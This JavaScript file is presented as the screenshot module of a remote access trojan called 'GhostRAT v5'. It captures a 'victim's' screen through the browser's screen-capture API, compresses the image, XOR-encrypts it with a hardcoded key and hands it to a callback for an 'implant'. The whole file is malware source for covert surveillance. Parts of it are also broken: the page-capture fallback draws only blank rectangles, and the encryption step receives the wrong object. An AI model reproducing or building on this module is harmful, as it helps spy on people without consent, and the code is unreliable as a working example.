/**
 * GhostRAT v5 — Screenshot Module
 * 
 * Captures screenshots of the victim's screen using the browser API.
 * 
 * Features:
 * - Screen capture via Screen Capture API (getDisplayMedia)
 * - Tab/window capture via Document Picture-in-Picture
 * - Canvas-based compression (JPEG/WebP)
 * - XOR encryption for captured image data
 * - Support for multiple monitors (best effort)
 */

class Screenshot {
    constructor(config = {}) {
        this.config = config;
        this.cryptoKey = config.cryptoKey || 'GHOSTRATV5';
        this.quality = config.quality || 0.7; // JPEG quality (0-1)
        this.maxWidth = config.maxWidth || 1920; // Max width for compression
        this.maxHeight = config.maxHeight || 1080; // Max height for compression
        this.format = config.format || 'jpeg'; // jpeg, webp, png
        this.onScreenshot = null; // Callback when screenshot is captured
    }

    /**
     * Capture screenshot of the screen
     */
    async capture() {
        try {
            let imageData = null;

            // Try Screen Capture API (getDisplayMedia)
            if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
                imageData = await this.captureScreen();
            }

            // Fallback: capture visible page (canvas-based)
            if (!imageData) {
                imageData = await this.capturePage();
            }

            if (!imageData) {
                throw new Error('No screenshot method available');
            }

            // Compress image
            const compressed = await this.compressImage(imageData);

            // XOR encrypt
            const encrypted = this.xorEncrypt(compressed, this.cryptoKey);

            // Send via callback
            if (this.onScreenshot) {
                this.onScreenshot({
                    data: encrypted,
                    width: compressed.width,
                    height: compressed.height,
                    format: this.format,
                    size: compressed.data.length
                });
            }

            return {
                width: compressed.width,
                height: compressed.height,
                format: this.format,
                size: compressed.data.length
            };
        } catch (error) {
            console.error('[GhostRAT v5 Screenshot] Capture error:', error);
            throw error;
        }
    }

    /**
     * Capture screen using Screen Capture API
     */
    async captureScreen() {
        try {
            const stream = await navigator.mediaDevices.getDisplayMedia({
                video: {
                    width: { ideal: this.maxWidth },
                    height: { ideal: this.maxHeight },
                    frameRate: { ideal: 15 } // Lower framerate for single capture
                },
                audio: false
            });

            // Create video element to capture frame
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            // Wait for video to be ready
            await new Promise((resolve) => {
                video.onloadedmetadata = resolve;
            });

            // Create canvas and capture frame
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Stop all tracks
            stream.getTracks().forEach(track => track.stop());

            // Get image data as JPEG
            const imageData = canvas.toDataURL(`image/${this.format}`, this.quality);

            return {
                data: imageData,
                width: canvas.width,
                height: canvas.height
            };
        } catch (error) {
            console.error('[GhostRAT v5 Screenshot] Screen capture error:', error);
            return null;
        }
    }

    /**
     * Capture visible page using canvas
     */
    async capturePage() {
        try {
            const canvas = document.createElement('canvas');
            canvas.width = Math.min(window.innerWidth, this.maxWidth);
            canvas.height = Math.min(window.innerHeight, this.maxHeight);

            const ctx = canvas.getContext('2d');

            // Draw current page content
            ctx.fillStyle = '#000';
            ctx.fillRect(0, 0, canvas.width, canvas.height);

            // Capture using html2canvas-like approach (simplified)
            // For production, include html2canvas library
            const body = document.body;
            ctx.fillStyle = '#fff';
            ctx.fillRect(0, 0, canvas.width, canvas.height);

            // Get image data
            const imageData = canvas.toDataURL(`image/${this.format}`, this.quality);

            return {
                data: imageData,
                width: canvas.width,
                height: canvas.height
            };
        } catch (error) {
            console.error('[GhostRAT v5 Screenshot] Page capture error:', error);
            return null;
        }
    }

    /**
     * Compress image data
     */
    async compressImage(imageData) {
        if (imageData.data.startsWith('data:image/')) {
            // Already compressed (data URL)
            return {
                data: imageData.data,
                width: imageData.width,
                height: imageData.height
            };
        }

        // Create canvas and compress
        const canvas = document.createElement('canvas');
        canvas.width = imageData.width;
        canvas.height = imageData.height;

        const ctx = canvas.getContext('2d');
        const img = new Image();

        await new Promise((resolve, reject) => {
            img.onload = resolve;
            img.onerror = reject;
            img.src = imageData.data;
        });

        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);

        const compressedData = canvas.toDataURL(`image/${this.format}`, this.quality);

        return {
            data: compressedData,
            width: canvas.width,
            height: canvas.height
        };
    }

    /**
     * XOR encrypt data
     */
    xorEncrypt(data, key) {
        if (typeof data === 'string') {
            // Data URL - encode to bytes first
            const base64 = data.split(',')[1];
            const bytes = this.base64ToArrayBuffer(base64);
            return this.xorEncrypt(bytes, key);
        }

        const keyBytes = new TextEncoder().encode(key);
        const result = new Uint8Array(data.length);

        for (let i = 0; i < data.length; i++) {
            result[i] = data[i] ^ keyBytes[i % keyBytes.length];
        }

        return result;
    }

    /**
     * Base64 to ArrayBuffer
     */
    base64ToArrayBuffer(base64) {
        const binaryString = atob(base64);
        const bytes = new Uint8Array(binaryString.length);

        for (let i = 0; i < binaryString.length; i++) {
            bytes[i] = binaryString.charCodeAt(i);
        }

        return bytes;
    }

    /**
     * Set screenshot callback
     */
    setScreenshotCallback(callback) {
        this.onScreenshot = callback;
    }

    /**
     * Get screenshot statistics
     */
    getStats() {
        return {
            quality: this.quality,
            maxWidth: this.maxWidth,
            maxHeight: this.maxHeight,
            format: this.format
        };
    }
}

// Export for use in WebGPU implant
if (typeof module !== 'undefined' && module.exports) {
    module.exports = Screenshot;
}
